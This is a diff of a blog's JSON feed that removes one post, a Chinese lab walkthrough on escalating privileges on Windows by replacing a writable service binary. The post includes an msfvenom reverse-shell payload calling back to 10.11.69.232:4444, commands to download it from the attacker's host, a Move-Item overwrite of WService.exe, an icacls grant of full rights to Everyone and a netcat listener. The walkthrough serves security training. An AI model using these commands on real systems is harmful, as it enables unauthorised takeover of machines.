@@ -53,16 +53,6 @@
             "tags": [
                 "横向移动"
             ]
-        },
-        {
-            "id": "https://k1t0111.github.io/2024/03/19/win%E6%8F%90%E6%9D%83%E7%AC%AC%E4%BA%8C%E5%BC%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/",
-            "url": "https://k1t0111.github.io/2024/03/19/win%E6%8F%90%E6%9D%83%E7%AC%AC%E4%BA%8C%E5%BC%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/",
-            "title": "权限提升-windows服务提权",
-            "date_published": "2024-03-19T14:06:27.000Z",
-            "content_html": "<h1 id=\"0x01-windows服务\"><a class=\"anchor\" href=\"#0x01-windows服务\">#</a> 0X01 windows 服务</h1>\n<blockquote>\n<p>Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>\n<p>其次我们可以知道 windows 服务是 与 exe 可执行文件相关，同时 我们可以知道服务需要指定一个用户，因此我们能够想到什么 就是上次我们分享到 计划任务</p>\n<p>如果我们能够也获得相应 exe 文件的修改权限我们是否可以根据这个权限，执行一个 payload 获取到相应服务指定用户的权限</p>\n</blockquote>\n<h1 id=\"0x02-靶场实践\"><a class=\"anchor\" href=\"#0x02-靶场实践\">#</a> 0x02 靶场实践</h1>\n<h2 id=\"查找-windows服务\"><a class=\"anchor\" href=\"#查找-windows服务\">#</a> 查找 windows 服务</h2>\n<blockquote>\n<p>首先找一找服务 选一个服务 看到了 WindowsScheduler</p>\n</blockquote>\n<p>&lt;br/&gt;</p>\n<p><img loading=\"lazy\" data-src=\"https://img2.imgtp.com/2024/03/18/1mRaN220.png\" alt=\"\" /></p>\n<blockquote>\n<p>我们可以看到 执行的二进制文件 C:\\PROGRA<sub>2\\SYSTEM</sub>1\\WService.exe</p>\n<p>&lt;br/&gt;</p>\n</blockquote>\n<h2 id=\"权限\"><a class=\"anchor\" href=\"#权限\">#</a> 权限</h2>\n<p>&lt;br/&gt;</p>\n<blockquote>\n<p>看看权限</p>\n</blockquote>\n<p><img loading=\"lazy\" data-src=\"https://img2.imgtp.com/2024/03/18/9899R1FF.png\" alt=\"\" /></p>\n<blockquote>\n<p>其实这个时候我们就可以看到 我们 everyone 组有读写权限 有权限就好办</p>\n</blockquote>\n<h2 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h2>\n<blockquote>\n<p>msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444 -f exe-service  -o 1.exe</p>\n<p>生成一个 服务的二进制文件 可以直接连接的</p>\n</blockquote>\n<p>&lt;br/&gt;</p>\n<h2 id=\"载荷投递\"><a class=\"anchor\" href=\"#载荷投递\">#</a> 载荷投递</h2>\n<blockquote>\n<p>kali 建立 http 服务</p>\n<p>在受害机器中 wget <a href=\"http://ip:8000/1.exe\">http://ip:8000/1.exe</a> -O rev-svc.exe</p>\n<p>应该是 wget 可以在 powershell 中使用不过这是个安装了 wget</p>\n<p>正常应该是使用</p>\n<p>Invoke-WebRequest  -Uri  &quot;<a href=\"https://10.11.69.232/1.exe\">https://10.11.69.232/1.exe</a>&quot;  -OutFile&quot;1.exe&quot;</p>\n</blockquote>\n<p>&lt;br/&gt;</p>\n<h2 id=\"修改替换\"><a class=\"anchor\" href=\"#修改替换\">#</a> 修改替换</h2>\n<blockquote>\n<p>此时我们正常会想到什么？那肯定是利用我们的权限然后直接覆盖掉服务的 exe 文件</p>\n<p>直接 找到  \\PROGRA<sub>2\\SYSTEM</sub>1</p>\n</blockquote>\n<p><img loading=\"lazy\" data-src=\"https://img2.imgtp.com/2024/03/19/JuZV7N1q.png\" alt=\"\" /></p>\n<blockquote>\n<p>又试了 shell<br />\nMove-Item -Path &quot;C:\\Users\\thm-unpriv\\1.exe&quot; -Destination &quot;C:\\PROGRA<sub>2\\SYSTEM</sub>1\\WService.exe&quot; 完美解决 直接将我们的 1.exe 换成了</p>\n<p>此时查看权限我们应该是由 完整的拥有这个文件的所有权限</p>\n<p>但是此时我们不仅是要看我们有这个权限我们还要看 我们要运行的服务的目标账户有没有权限</p>\n<p>要把权限 给足 直接就是 icacls 服务 /grant Everyone:F</p>\n</blockquote>\n<h2 id=\"get-shell\"><a class=\"anchor\" href=\"#get-shell\">#</a> get shell</h2>\n<blockquote>\n<p>直接 nc -lvp 4444</p>\n<p>启动服务连接</p>\n</blockquote>\n",
-            "tags": [
-                "权限提升"
-            ]
         }
     ]
 }
